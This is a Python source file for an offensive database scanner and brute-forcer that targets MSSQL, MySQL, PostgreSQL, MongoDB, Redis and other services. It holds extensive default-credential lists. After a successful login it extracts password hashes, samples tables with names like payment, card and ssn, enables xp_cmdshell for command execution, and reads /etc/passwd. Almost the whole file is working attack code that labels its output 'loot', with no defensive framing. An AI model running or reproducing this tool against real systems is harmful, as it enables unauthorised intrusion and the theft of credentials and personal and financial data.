#!/usr/bin/env python3
"""
# Author: sinX
Deep Database Scanner & Bruteforcer
- Port discovery
- Credential bruteforce (large built-in lists + custom wordlist file)
- Post-auth data extraction: version, users, password hashes, databases, tables, sample data
- xp_cmdshell / UDF command execution attempts
- Only emits confirmed hits + full loot
"""

import socket
import threading
import time
import os
from typing import Callable, List, Dict, Optional, Tuple


# ─── Credential lists ────────────────────────────────────────────────────────

DEFAULT_CREDS: Dict[str, List[Tuple[str, str]]] = {

    "mssql": [
        # sa — blank / common
        ("sa",""), ("sa","sa"), ("sa","SA"), ("sa","Sa"),
        ("sa","password"), ("sa","Password"), ("sa","password1"), ("sa","Password1"),
        ("sa","Password1!"), ("sa","Password123"), ("sa","Password123!"),
        ("sa","P@ssw0rd"), ("sa","P@ssword"), ("sa","P@$$w0rd"), ("sa","Pa$$w0rd"),
        ("sa","admin"), ("sa","Admin"), ("sa","Admin1"), ("sa","Admin123"),
        ("sa","Admin123!"), ("sa","administrator"),
        ("sa","sql"), ("sa","SQL"), ("sa","mssql"), ("sa","sqlserver"),
        ("sa","SqlServer1"), ("sa","Sqlserver1!"), ("sa","sql2019"), ("sa","sql2017"),
        ("sa","sql2016"), ("sa","sql2014"), ("sa","sql2012"),
        ("sa","1234"), ("sa","12345"), ("sa","123456"), ("sa","1234567890"),
        ("sa","qwerty"), ("sa","abc123"), ("sa","Abc123!"),
        ("sa","welcome"), ("sa","Welcome1"), ("sa","Welcome123"), ("sa","Welcome1!"),
        ("sa","changeme"), ("sa","Change123"), ("sa","changeme1"),
        ("sa","root"), ("sa","toor"), ("sa","pass"), ("sa","Pass1"),
        ("sa","test"), ("sa","Test123"), ("sa","database"), ("sa","Database1"),
        ("sa","master"), ("sa","Master1"), ("sa","letmein"), ("sa","Letmein1"),
        ("sa","Spring2024!"), ("sa","Summer2024!"), ("sa","Fall2024!"), ("sa","Winter2024!"),
        ("sa","Spring2023!"), ("sa","Summer2023!"), ("sa","Fall2023!"), ("sa","Winter2023!"),
        ("sa","January2024"), ("sa","February2024"), ("sa","March2024"),
        ("sa","Company1"), ("sa","Company123"), ("sa","company"),
        ("sa","secure"), ("sa","security"), ("sa","default"), ("sa","secret"),
        # Other common MSSQL accounts
        ("admin",""), ("admin","admin"), ("admin","Admin"), ("admin","admin123"),
        ("admin","Admin123"), ("admin","password"), ("admin","Password1"),
        ("admin","administrator"),
        ("administrator",""), ("administrator","password"), ("administrator","Password1"),
        ("Administrator","password"), ("Administrator","Password1"),
        ("user","user"), ("user","password"), ("user","User123"),
        ("guest",""), ("guest","guest"),
    ],

    "mysql": [
        ("root",""), ("root","root"), ("root","toor"), ("root","ROOT"),
        ("root","password"), ("root","Password"), ("root","password1"),
        ("root","Password1"), ("root","Password123"), ("root","P@ssw0rd"),
        ("root","mysql"), ("root","MySQL"), ("root","mysql123"), ("root","Mysql123"),
        ("root","admin"), ("root","Admin"), ("root","Admin123"),
        ("root","123456"), ("root","12345"), ("root","1234"),
        ("root","qwerty"), ("root","abc123"), ("root","changeme"),
        ("root","letmein"), ("root","welcome"), ("root","Welcome1"),
        ("root","default"), ("root","master"), ("root","secret"),
        ("mysql",""), ("mysql","mysql"), ("mysql","MySQL"), ("mysql","mysql123"),
        ("admin",""), ("admin","admin"), ("admin","Admin"), ("admin","Admin123"),
        ("admin","password"), ("admin","Password1"),
        ("administrator",""), ("administrator","administrator"),
        ("test",""), ("test","test"), ("test","test123"),
        ("user",""), ("user","user"), ("user","password"), ("user","User123"),
        ("sa",""), ("sa","sa"), ("sa","password"), ("sa","Password1"),
        ("dbadmin",""), ("dbadmin","dbadmin"), ("dbadmin","password"),
        ("wordpress","wordpress"), ("wordpress","password"),
        ("joomla","joomla"), ("drupal","drupal"),
        ("guest",""), ("guest","guest"),
        ("backup","backup"), ("backup","password"),
    ],

    "postgresql": [
        ("postgres",""), ("postgres","postgres"), ("postgres","Postgres"),
        ("postgres","password"), ("postgres","Password"), ("postgres","Password1"),
        ("postgres","postgres123"), ("postgres","Postgres123"),
        ("postgres","admin"), ("postgres","Admin"), ("postgres","Admin123"),
        ("postgres","123456"), ("postgres","qwerty"),
        ("postgres","P@ssw0rd"), ("postgres","postgrespass"),
        ("postgres","changeme"), ("postgres","welcome"),
        ("admin",""), ("admin","admin"), ("admin","Admin123"), ("admin","password"),
        ("administrator",""), ("administrator","administrator"),
        ("pgsql",""), ("pgsql","pgsql"), ("pgsql","password"),
        ("test",""), ("test","test"), ("test","test123"),
        ("user",""), ("user","user"), ("user","password"),
        ("dbuser",""), ("dbuser","dbuser"), ("dbuser","password"),
        ("root",""), ("root","root"), ("root","password"),
        ("guest",""), ("guest","guest"),
    ],

    "mongodb": [
        # Try no-auth first (very common)
        ("",""),
        ("admin",""), ("admin","admin"), ("admin","Admin"), ("admin","Admin123"),
        ("admin","password"), ("admin","Password1"), ("admin","Password123"),
        ("root",""), ("root","root"), ("root","password"), ("root","Password1"),
        ("mongodb",""), ("mongodb","mongodb"), ("mongodb","password"),
        ("user",""), ("user","user"), ("user","password"),
        ("sa",""), ("sa","sa"), ("sa","password"),
        ("test",""), ("test","test"),
        ("administrator",""), ("administrator","administrator"),
        ("guest",""), ("guest","guest"),
        ("dbadmin","dbadmin"), ("dbadmin",""),
    ],

    "redis": [
        # No password
        ("",""),
        # Common passwords
        ("","redis"), ("","password"), ("","Password"), ("","Password1"),
        ("","123456"), ("","12345"), ("","1234"),
        ("","admin"), ("","Admin"), ("","admin123"),
        ("","root"), ("","toor"),
        ("","foobared"),  # Redis example config default
        ("","redispassword"), ("","redis123"), ("","Redis123"),
        ("","secret"), ("","Secret"), ("","secret123"),
        ("","test"), ("","changeme"), ("","welcome"),
        ("","qwerty"), ("","abc123"), ("","letmein"),
        ("","default"), ("","master"),
    ],

    "cassandra": [
        ("cassandra","cassandra"), ("cassandra",""), ("cassandra","password"),
        ("admin","admin"), ("admin",""), ("admin","password"),
        ("",""), ("root",""), ("root","root"),
    ],

    "elasticsearch": [
        ("elastic",""), ("elastic","elastic"), ("elastic","changeme"),
        ("elastic","password"), ("elastic","Password"), ("elastic","Password1"),
        ("admin",""), ("admin","admin"), ("admin","password"),
        ("root",""), ("root","root"),
    ],
}

DEFAULT_PORTS: Dict[str, int] = {
    "mysql":         3306,
    "postgresql":    5432,
    "mongodb":       27017,
    "redis":         6379,
    "mssql":         1433,
    "cassandra":     9042,
    "elasticsearch": 9200,
    "couchdb":       5984,
    "memcached":     11211,
}


# ─── Wordlist loader ──────────────────────────────────────────────────────────

def load_wordlist(path: str, default_user: str = "root") -> List[Tuple[str, str]]:
    """Load user:pass pairs from a file. Lines can be 'user:pass' or just 'pass'."""
    pairs = []
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    u, p = line.split(":", 1)
                    pairs.append((u.strip(), p.strip()))
                else:
                    pairs.append((default_user, line))
    except Exception:
        pass
    return pairs


# ─── Port scanner ─────────────────────────────────────────────────────────────

def probe_port(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ─── Auth testers ─────────────────────────────────────────────────────────────

def _try_mssql(host, port, user, password, timeout):
    try:
        import pymssql
        conn = pymssql.connect(host=host, port=str(port), user=user, password=password,
                               timeout=int(timeout), login_timeout=int(timeout))
        conn.close()
        return True
    except Exception:
        return False

def _try_mysql(host, port, user, password, timeout):
    try:
        import pymysql
        conn = pymysql.connect(host=host, port=port, user=user, password=password,
                               connect_timeout=int(timeout), read_timeout=int(timeout))
        conn.close()
        return True
    except Exception:
        return False

def _try_postgresql(host, port, user, password, timeout):
    try:
        import psycopg2
        conn = psycopg2.connect(host=host, port=port, user=user, password=password,
                                database="postgres", connect_timeout=int(timeout))
        conn.close()
        return True
    except Exception:
        return False

def _try_mongodb(host, port, user, password, timeout):
    try:
        import pymongo
        uri = (f"mongodb://{user}:{password}@{host}:{port}/?authSource=admin"
               if user else f"mongodb://{host}:{port}/")
        uri += f"&serverSelectionTimeoutMS={int(timeout*1000)}"
        client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=int(timeout*1000))
        client.server_info()
        client.close()
        return True
    except Exception:
        return False

def _try_redis(host, port, user, password, timeout):
    try:
        import redis as rlib
        r = rlib.Redis(host=host, port=port,
                       password=password if password else None,
                       socket_connect_timeout=timeout, socket_timeout=timeout)
        r.ping()
        r.close()
        return True
    except Exception:
        return False

def _try_elasticsearch(host, port, user, password, timeout):
    try:
        import urllib.request, base64
        cred = base64.b64encode(f"{user}:{password}".encode()).decode() if user else None
        req  = urllib.request.Request(f"http://{host}:{port}/")
        if cred:
            req.add_header("Authorization", f"Basic {cred}")
        urllib.request.urlopen(req, timeout=timeout)
        return True
    except Exception:
        return False

_TESTERS = {
    "mssql":         _try_mssql,
    "mysql":         _try_mysql,
    "postgresql":    _try_postgresql,
    "mongodb":       _try_mongodb,
    "redis":         _try_redis,
    "elasticsearch": _try_elasticsearch,
}


# ─── Data extraction ──────────────────────────────────────────────────────────

def extract_mssql(host, port, user, password, emit=None):
    def log(m, lvl="info"):
        if emit: emit({"type": "log", "message": m, "level": lvl})

    loot = {"type": "mssql", "host": host, "port": port, "user": user}
    try:
        import pymssql
        conn = pymssql.connect(host=host, port=str(port), user=user,
                               password=password, timeout=20, login_timeout=10)
        cur  = conn.cursor()

        # ── Server info ──
        try:
            cur.execute("SELECT @@VERSION, @@SERVERNAME, DB_NAME(), SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')")
            r = cur.fetchone()
            loot.update({
                "version":    r[0].split("\n")[0].strip() if r[0] else "?",
                "servername": r[1], "current_db": r[2],
                "system_user": r[3], "is_sysadmin": bool(r[4]),
            })
            log(f"Server: {loot['servername']} | User: {loot['system_user']} | sysadmin: {loot['is_sysadmin']}", "ok")
        except Exception as e:
            log(f"Version query failed: {e}", "warn")

        # ── Databases ──
        try:
            cur.execute("SELECT name, state_desc FROM sys.databases ORDER BY name")
            loot["databases"] = [{"name": r[0], "state": r[1]} for r in cur.fetchall()]
            log(f"Found {len(loot['databases'])} databases: {', '.join(d['name'] for d in loot['databases'])}", "found")
        except Exception as e:
            log(f"DB list failed: {e}", "warn")

        # ── Logins ──
        try:
            cur.execute("""
                SELECT name, type_desc, is_disabled, create_date
                FROM sys.server_principals
                WHERE type IN ('S','U','G') ORDER BY name
            """)
            loot["logins"] = [{"name": r[0], "type": r[1], "disabled": bool(r[2]), "created": str(r[3])} for r in cur.fetchall()]
            log(f"Found {len(loot['logins'])} server logins", "found")
        except Exception as e:
            log(f"Login list failed: {e}", "warn")

        # ── Password hashes ──
        try:
            cur.execute("SELECT name, CONVERT(VARCHAR(MAX), CAST(password_hash AS VARBINARY(MAX)), 1) FROM sys.sql_logins")
            loot["password_hashes"] = [{"user": r[0], "hash": r[1]} for r in cur.fetchall() if r[1]]
            if loot["password_hashes"]:
                log(f"Extracted {len(loot['password_hashes'])} password hash(es)!", "secret")
        except Exception as e:
            log(f"Hash extraction failed (need sysadmin): {e}", "warn")

        # ── Tables per database ──
        loot["tables"] = {}
        user_dbs = [d["name"] for d in loot.get("databases", [])
                    if d["name"] not in ("master", "tempdb", "model", "msdb")][:8]
        for db in user_dbs:
            try:
                cur.execute(f"""
                    SELECT TABLE_SCHEMA, TABLE_NAME
                    FROM [{db}].[information_schema].[tables]
                    WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_NAME
                """)
                tables = [f"{r[0]}.{r[1]}" for r in cur.fetchall()]
                loot["tables"][db] = tables
                log(f"DB [{db}]: {len(tables)} tables", "found")
            except Exception:
                pass

        # ── Sample data from interesting tables ──
        loot["sample_data"] = {}
        keywords = ("user","account","member","customer","password","pass","credential","login","email","admin","staff","employee","order","payment","credit","card","ssn","secret","token","key","config")
        for db, tables in loot.get("tables", {}).items():
            for table in tables:
                tname = table.split(".")[-1].lower()
                if any(k in tname for k in keywords):
                    try:
                        cur.execute(f"SELECT TOP 5 * FROM [{db}].[{table.replace('.', '].[')}]")
                        cols  = [d[0] for d in cur.description]
                        rows  = cur.fetchall()
                        loot["sample_data"][f"{db}.{table}"] = {"columns": cols, "rows": [list(r) for r in rows]}
                        log(f"Sample data from [{db}].[{table}]: {len(rows)} row(s)", "secret")
                    except Exception:
                        pass

        # ── xp_cmdshell ──
        try:
            cur.execute("EXEC xp_cmdshell 'whoami 2>&1'")
            rows = [r[0] for r in cur.fetchall() if r[0]]
            if rows:
                loot["cmdshell"] = rows
                log(f"xp_cmdshell whoami: {rows[0]}", "secret")
        except Exception:
            # Try enabling it first
            try:
                cur.execute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
                cur.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
                cur.execute("EXEC xp_cmdshell 'whoami'")
                rows = [r[0] for r in cur.fetchall() if r[0]]
                if rows:
                    loot["cmdshell"] = rows
                    log(f"xp_cmdshell (enabled by us) whoami: {rows[0]}", "secret")
            except Exception:
                pass

        # ── Linked servers ──
        try:
            cur.execute("SELECT name, data_source, provider FROM sys.servers WHERE is_linked=1")
            loot["linked_servers"] = [{"name": r[0], "source": r[1], "provider": r[2]} for r in cur.fetchall()]
            if loot["linked_servers"]:
                log(f"Found {len(loot['linked_servers'])} linked server(s)", "found")
        except Exception:
            pass

        conn.close()
        log("MSSQL extraction complete.", "ok")

    except Exception as e:
        loot["error"] = str(e)
        log(f"Extraction error: {e}", "error")

    return loot


def extract_mysql(host, port, user, password, emit=None):
    def log(m, lvl="info"):
        if emit: emit({"type": "log", "message": m, "level": lvl})

    loot = {"type": "mysql", "host": host, "port": port, "user": user}
    try:
        import pymysql
        conn = pymysql.connect(host=host, port=port, user=user, password=password,
                               connect_timeout=15, read_timeout=20)
        cur  = conn.cursor()

        try:
            cur.execute("SELECT VERSION(), USER(), @@hostname, @@datadir")
            r = cur.fetchone()
            loot.update({"version": r[0], "current_user": r[1], "hostname": r[2], "datadir": r[3]})
            log(f"MySQL {r[0]} on {r[2]} | user={r[1]}", "ok")
        except Exception: pass

        try:
            cur.execute("SHOW DATABASES")
            loot["databases"] = [r[0] for r in cur.fetchall()]
            log(f"Databases: {', '.join(loot['databases'])}", "found")
        except Exception: pass

        # User password hashes
        try:
            cur.execute("SELECT user, host, authentication_string FROM mysql.user")
            loot["users"] = [{"user": r[0], "host": r[1], "hash": r[2]} for r in cur.fetchall()]
            log(f"Extracted {len(loot['users'])} MySQL user hash(es)!", "secret")
        except Exception:
            try:
                cur.execute("SELECT user, host, password FROM mysql.user")
                loot["users"] = [{"user": r[0], "host": r[1], "hash": r[2]} for r in cur.fetchall()]
                log(f"Extracted {len(loot['users'])} MySQL user hash(es)!", "secret")
            except Exception: pass

        loot["tables"] = {}
        skip = {"information_schema", "performance_schema", "sys"}
        for db in [d for d in loot.get("databases", []) if d not in skip][:8]:
            try:
                cur.execute(f"USE `{db}`; SHOW TABLES")
                cur.nextset()
                loot["tables"][db] = [r[0] for r in cur.fetchall()]
                log(f"DB [{db}]: {len(loot['tables'][db])} tables", "found")
            except Exception: pass

        # Sample sensitive tables
        loot["sample_data"] = {}
        keywords = ("user","account","member","customer","password","credential","login","email","admin","order","payment","credit","card","token","secret","config","key")
        for db, tables in loot.get("tables", {}).items():
            for table in tables:
                if any(k in table.lower() for k in keywords):
                    try:
                        cur.execute(f"SELECT * FROM `{db}`.`{table}` LIMIT 5")
                        cols = [d[0] for d in cur.description]
                        rows = cur.fetchall()
                        loot["sample_data"][f"{db}.{table}"] = {"columns": cols, "rows": [list(r) for r in rows]}
                        log(f"Sample data from `{db}`.`{table}`: {len(rows)} row(s)", "secret")
                    except Exception: pass

        # Read files if FILE privilege
        try:
            cur.execute("SELECT LOAD_FILE('/etc/passwd')")
            r = cur.fetchone()
            if r and r[0]:
                loot["etc_passwd"] = r[0][:2000]
                log("Read /etc/passwd via LOAD_FILE!", "secret")
        except Exception: pass

        conn.close()
        log("MySQL extraction complete.", "ok")

    except Exception as e:
        loot["error"] = str(e)

    return loot


def extract_postgresql(host, port, user, password, emit=None):
    def log(m, lvl="info"):
        if emit: emit({"type": "log", "message": m, "level": lvl})

    loot = {"type": "postgresql", "host": host, "port": port, "user": user}
    try:
        import psycopg2
        conn = psycopg2.connect(host=host, port=port, user=user, password=password,
                                database="postgres", connect_timeout=15)
        cur  = conn.cursor()

        try:
            cur.execute("SELECT version(), current_user, pg_postmaster_start_time()")
            r = cur.fetchone()
            loot.update({"version": r[0], "current_user": r[1], "started": str(r[2])})
            log(f"PostgreSQL: {r[0][:60]} | user={r[1]}", "ok")
        except Exception: pass

        try:
            cur.execute("SELECT datname FROM pg_database ORDER BY datname")
            loot["databases"] = [r[0] for r in cur.fetchall()]
            log(f"Databases: {', '.join(loot['databases'])}", "found")
        except Exception: pass

        try:
            cur.execute("SELECT usename, usesuper, passwd FROM pg_shadow")
            loot["users"] = [{"user": r[0], "superuser": r[1], "hash": r[2]} for r in cur.fetchall()]
            log(f"Extracted {len(loot['users'])} pg_shadow hash(es)!", "secret")
        except Exception:
            try:
                cur.execute("SELECT usename, usesuper, usecreatedb FROM pg_user")
                loot["users"] = [{"user": r[0], "superuser": r[1], "createdb": r[2]} for r in cur.fetchall()]
                log(f"Found {len(loot['users'])} pg users", "found")
            except Exception: pass

        # Read /etc/passwd via COPY
        try:
            cur.execute("CREATE TEMP TABLE _loot_passwd(data text)")
            cur.execute("COPY _loot_passwd FROM '/etc/passwd'")
            cur.execute("SELECT string_agg(data, E'\\n') FROM _loot_passwd")
            r = cur.fetchone()
            if r and r[0]:
                loot["etc_passwd"] = r[0][:2000]
                log("Read /etc/passwd via COPY!", "secret")
            cur.execute("DROP TABLE IF EXISTS _loot_passwd")
        except Exception: pass

        conn.close()
        log("PostgreSQL extraction complete.", "ok")

    except Exception as e:
        loot["error"] = str(e)

    return loot


def extract_mongodb(host, port, user, password, emit=None):
    def log(m, lvl="info"):
        if emit: emit({"type": "log", "message": m, "level": lvl})

    loot = {"type": "mongodb", "host": host, "port": port, "user": user}
    try:
        import pymongo
        uri = (f"mongodb://{user}:{password}@{host}:{port}/?authSource=admin"
               if user else f"mongodb://{host}:{port}/")
        client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=15000)

        try:
            info = client.server_info()
            loot["version"] = info.get("version", "?")
            log(f"MongoDB {loot['version']}", "ok")
        except Exception: pass

        try:
            dbs = client.list_database_names()
            loot["databases"] = dbs
            log(f"Databases: {', '.join(dbs)}", "found")
        except Exception: pass

        loot["collections"] = {}
        loot["sample_data"] = {}
        keywords = ("user","account","member","customer","password","credential","login","email","admin","order","payment","token","secret","key")
        for db in loot.get("databases", []):
            if db in ("local", "config"):
                continue
            try:
                cols = client[db].list_collection_names()
                loot["collections"][db] = cols
                log(f"DB [{db}]: {len(cols)} collections — {', '.join(cols[:5])}", "found")
                for col in cols:
                    if any(k in col.lower() for k in keywords):
                        docs = list(client[db][col].find({}, {"_id": 0}).limit(3))
                        if docs:
                            loot["sample_data"][f"{db}.{col}"] = docs
                            log(f"Sample from [{db}].[{col}]: {len(docs)} doc(s)", "secret")
            except Exception: pass

        client.close()
        log("MongoDB extraction complete.", "ok")

    except Exception as e:
        loot["error"] = str(e)

    return loot


def extract_redis(host, port, password, emit=None):
    def log(m, lvl="info"):
        if emit: emit({"type": "log", "message": m, "level": lvl})

    loot = {"type": "redis", "host": host, "port": port}
    try:
        import redis as rlib
        r = rlib.Redis(host=host, port=port,
                       password=password if password else None,
                       socket_connect_timeout=10, socket_timeout=10)

        loot["info"] = r.info("server")
        log(f"Redis {loot['info'].get('redis_version','?')} | OS: {loot['info'].get('os','?')}", "ok")

        try:
            loot["config"] = dict(r.config_get("*"))
            log(f"Extracted {len(loot['config'])} config keys", "found")
        except Exception: pass

        try:
            loot["dbsize"] = r.dbsize()
            log(f"Keys in DB: {loot['dbsize']}", "found")
        except Exception: pass

        # Dump all keys (limit to 500)
        try:
            keys = r.keys("*")[:500]
            loot["keys"] = {}
            for k in keys:
                try:
                    kstr  = k.decode("utf-8", errors="replace")
                    ktype = r.type(k).decode()
                    if ktype == "string":
                        val = r.get(k)
                        loot["keys"][kstr] = val.decode("utf-8", errors="replace") if val else None
                    elif ktype == "hash":
                        loot["keys"][kstr] = {
                            hk.decode(): hv.decode("utf-8", errors="replace")
                            for hk, hv in r.hgetall(k).items()
                        }
                    elif ktype in ("list", "set"):
                        members = r.lrange(k, 0, 9) if ktype == "list" else list(r.smembers(k))[:10]
                        loot["keys"][kstr] = [m.decode("utf-8", errors="replace") for m in members]
                except Exception:
                    pass
            log(f"Dumped {len(loot['keys'])} key(s) from Redis", "secret")
        except Exception: pass

        r.close()
        log("Redis extraction complete.", "ok")

    except Exception as e:
        loot["error"] = str(e)

    return loot


_EXTRACTORS = {
    "mssql":      lambda h, p, u, pw, emit: extract_mssql(h, p, u, pw, emit),
    "mysql":      lambda h, p, u, pw, emit: extract_mysql(h, p, u, pw, emit),
    "postgresql": lambda h, p, u, pw, emit: extract_postgresql(h, p, u, pw, emit),
    "mongodb":    lambda h, p, u, pw, emit: extract_mongodb(h, p, u, pw, emit),
    "redis":      lambda h, p, u, pw, emit: extract_redis(h, p, pw, pw, emit),
}


# ─── Main scanner ─────────────────────────────────────────────────────────────

class DBScanner:
    def __init__(
        self,
        target: str,
        port_override: Optional[Dict[str, int]] = None,
        custom_creds: Optional[Dict[str, List[Tuple[str, str]]]] = None,
        wordlist_file: Optional[str] = None,
        wordlist_user: str = "root",
        db_types: Optional[List[str]] = None,
        probe_timeout: float = 2.0,
        auth_timeout:  float = 5.0,
        threads: int = 8,
        extract: bool = True,
        emit: Optional[Callable] = None,
        stop_event=None,
    ):
        self.target       = target
        self.ports        = {**DEFAULT_PORTS, **(port_override or {})}
        self.db_types     = db_types or list(DEFAULT_PORTS.keys())
        self.auth_timeout = auth_timeout
        self.probe_timeout = probe_timeout
        self.threads      = threads
        self.extract      = extract
        self._emit_cb     = emit
        self._stop        = stop_event
        self.hits: List[Dict] = []

        # Build per-type credential list
        self.creds: Dict[str, List[Tuple[str, str]]] = {}
        wl_pairs = load_wordlist(wordlist_file, wordlist_user) if wordlist_file and os.path.exists(wordlist_file) else []

        for db in self.db_types:
            base = DEFAULT_CREDS.get(db, [])
            extra = (custom_creds or {}).get(db, [])
            # Append wordlist pairs for every DB type
            self.creds[db] = base + extra + wl_pairs

    def _emit(self, p):
        if self._emit_cb: self._emit_cb(p)

    def _log(self, m, lvl="info"):
        self._emit({"type": "log", "message": m, "level": lvl})

    def run(self):
        self._log(f"Deep DB scan → {self.target}", "info")
        self._emit({"type": "db_scan_start", "target": self.target})

        open_dbs = self._port_scan()
        if not open_dbs:
            self._log("No open database ports found.", "warn")
            self._emit({"type": "db_done", "hits": []})
            return

        self._log(f"Open DB ports: {', '.join(f'{db}:{p}' for db, p in open_dbs)}", "ok")

        for db_type, port in open_dbs:
            if self._stop and self._stop.is_set():
                break
            self._bruteforce(db_type, port)

        total = len(self.hits)
        self._log(f"Scan complete. {total} valid credential set(s).", "ok" if not total else "secret")
        self._emit({"type": "db_done", "hits": self.hits})

    def _port_scan(self) -> List[Tuple[str, int]]:
        results, lock = {}, threading.Lock()
        sem = threading.Semaphore(self.threads)

        def probe(db_type, port):
            with sem:
                if probe_port(self.target, port, self.probe_timeout):
                    with lock:
                        results[db_type] = port
                        self._log(f"Port open: {port}/{db_type}", "found")

        workers = [threading.Thread(target=probe, args=(db, self.ports[db]), daemon=True)
                   for db in self.db_types if self.ports.get(db)]
        for t in workers: t.start()
        for t in workers: t.join()
        return list(results.items())

    def _bruteforce(self, db_type: str, port: int):
        tester = _TESTERS.get(db_type)
        if not tester:
            return

        cred_list = self.creds.get(db_type, [])
        self._log(f"Bruteforcing {db_type} @ {self.target}:{port} — {len(cred_list)} credential pairs", "info")

        found_creds, lock = [], threading.Lock()
        sem = threading.Semaphore(self.threads)

        def try_cred(user, password):
            if self._stop and self._stop.is_set():
                return
            with sem:
                try:
                    if tester(self.target, port, user, password, self.auth_timeout):
                        disp_u = user or "<no user>"
                        disp_p = password if password else "<empty>"
                        self._log(f"✔ VALID [{db_type}] {self.target}:{port} → {disp_u} / {disp_p}", "secret")
                        hit = {"db_type": db_type, "host": self.target, "port": port,
                               "username": disp_u, "password": disp_p, "loot": {}}
                        with lock:
                            found_creds.append(hit)
                        self._emit({"type": "db_hit", "data": hit})
                except Exception:
                    pass

        workers = []
        for u, p in cred_list:
            if self._stop and self._stop.is_set():
                break
            t = threading.Thread(target=try_cred, args=(u, p), daemon=True)
            workers.append(t)
            t.start()
            if len(workers) % 20 == 0:
                time.sleep(0.05)

        for t in workers: t.join()
        self.hits.extend(found_creds)

        if not found_creds:
            self._log(f"No valid credentials found for {db_type}.", "info")
            return

        # ── Deep extraction on first valid cred ──
        if not self.extract:
            return

        first = found_creds[0]
        extractor = _EXTRACTORS.get(db_type)
        if not extractor:
            return

        self._log(f"Extracting data from {db_type}...", "info")
        try:
            loot = extractor(self.target, port, first["username"],
                             first["password"] if first["password"] != "<empty>" else "",
                             self._emit_cb)
            first["loot"] = loot
            self._emit({"type": "db_loot", "data": loot})
        except Exception as e:
            self._log(f"Extraction error: {e}", "error")
